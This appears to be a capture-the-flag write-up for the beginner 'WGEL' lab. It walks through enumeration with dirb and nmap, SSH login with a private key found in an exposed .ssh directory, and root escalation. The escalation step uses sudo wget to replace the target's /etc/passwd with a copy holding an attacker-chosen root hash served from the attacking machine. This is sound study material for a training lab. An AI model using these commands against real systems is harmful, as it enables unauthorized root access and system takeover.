# WGEL

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

## Step 1: Visit the webpage

- Apache2 Ubuntu Default Page, likely many standard settings

- found a comment that reminds "Jessie" to update the

- found "images" directly by reading the source code of the index.html

## Step 2: Directory Enumeration

- command: "dirb http://10.10.196.224:80 usr/share/wordlists/dirb/common.txt -r"

- didn't want a recursive enumeration, for now

- found "sitemap" which turned out to house a default web page.

- rescanned with the /sitemap/ directory

- found .ssh directory

- visited the directory and found an id_rsa private key, saved it

## Step 3: Port Scanning

- started this in new terminal while also doing dirb

- general: "nmap -Pn 10.10.229.111"

- found only port 22 and 80

- considered doing -p- but this is a beginner exercise, so unlikely to provide any value.

- next: nmap -Pn -A -oN vulns.txt 10.10.229.111 --script vuln

- resulted in lots of stuff

## Step 4: use "jessie" and the private key

- 'sudo chmod 600 id_rsa'

- go to john the ripper and ssh2john: python3 usr/share/john/ssh2john.py id_rsa > jessie.txt

- "id_rsa has no password"

- 'ssh -i id_rsa jessie@10.10.229.111' Note: user lower case; will still ask for a passphrase if you have "J" uppercase

- flag is in the Documents folder

## LINUX PRIVILEGE ESCALATION

## Step 5: sudo -l

- (ALL : ALL) ALL

- (root) NOPASSWD: /usr/bin/wget

## Step 6: Exploit sudo wget

- from GTFObins

- everything worked except the last line because the installed version of wget doesn't support (--use-askpass)

- not an answer

## Step 7: Get the passwd

- jessie can read the /etc/passwd

- started netcat listener on attacker

- on target device, copied the /etc/passwd to the /tmp folder

- on target device, in the /tmp, started python -m http.server

- on attacking device used the wget to copy the passwd: wget http://10.10.229.111:8000/passwd

- file downloaded

## Step 8: Generate a new root password

- keep it simple: "openssl passwd obz"

- output: $1$tGKmmLOd$WDilPxA95QzRcBIJaWpgz1

- put into the passwd file where it belons

## Step 9: Put passwd back onto target device

- start python server on attacking device, where the passwd is stored, port 8000 is the default

- use sudo wget http://10.2.29.130:8000/passwd -O /etc/passwd

- this overwrites our malicious file onto the legit file because we are using the sudo command

- next switch user: "su"

- provide the password used to generate our malicious hash: "obz"

- gain root
